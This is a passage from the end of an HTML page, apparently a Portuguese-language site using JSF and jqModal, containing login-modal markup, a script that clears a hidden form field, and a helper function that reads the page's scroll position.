/><input type="hidden" name="cancelarAcessoModalForm:_link_hidden_" /><script type="text/javascript"><!--
function clear_cancelarAcessoModalForm() {
  var f = document.forms['cancelarAcessoModalForm'];
  f.elements['cancelarAcessoModalForm:_link_hidden_'].value='';
  f.target='';
}
clear_cancelarAcessoModalForm();
//--></script></form></li></ul></li><li id="_id126" class="pl20"><div id="div-textoAposBotoes" class="textoAposBotoes"></div></li></ul><a id='marcador-fim-modal' href='javascript:;' class='tabindex tabmodal' 
                onblur='focoTituloModal()'></a></div><div id="modalLogin_jqmCornerBottom" class="jqmCornerBottom"><div id="jqmCornerBottom_1" class="cc"></div><div id="jqmCornerBottom_2" class="c3"></div><div id="jqmCornerBottom_3" class="c4"></div></div></div>
 

<!-- fim jqmWindow  -->
<!-- fim modal login -->
 	
    <div id="modalContent" class="jqmWindow modalNaoFecha" style="width:550px;"><div id="modalContent_jqmCornerTop" class="jqmCornerTop"><div id="modalContent_top_1" class="cc"></div><div id="modalContent_top_2" class="c1"></div><div id="modalContent_top_3" class="c2"></div></div><div class="jqmWrapper after"></div><div id="bottomModalContent" class="jqmCornerBottom"><span class="cc"><!-- --></span><span class="c3"><!-- --></span><span class="c4"><!-- --></span></div></div>
 


<script type="text/javascript"><!--
function getScrolling() {
    var x = 0; var y = 0;
    if (self.pageXOffset) {
        x = self.pageXOffset;
        y = self.pageYOffset;
    } else if (document.documentElement && document.documentElement.scrollLeft) {
        x = document.documentElement.scrollLeft;
        y = document.documentElement.scrollTop;
    } else if (document.body) {
        x = document.body.scrollLeft;
        y = document.body.scrollTop;
    }
    return x + "," + y;
}

//--></script>



</BODY>
</html>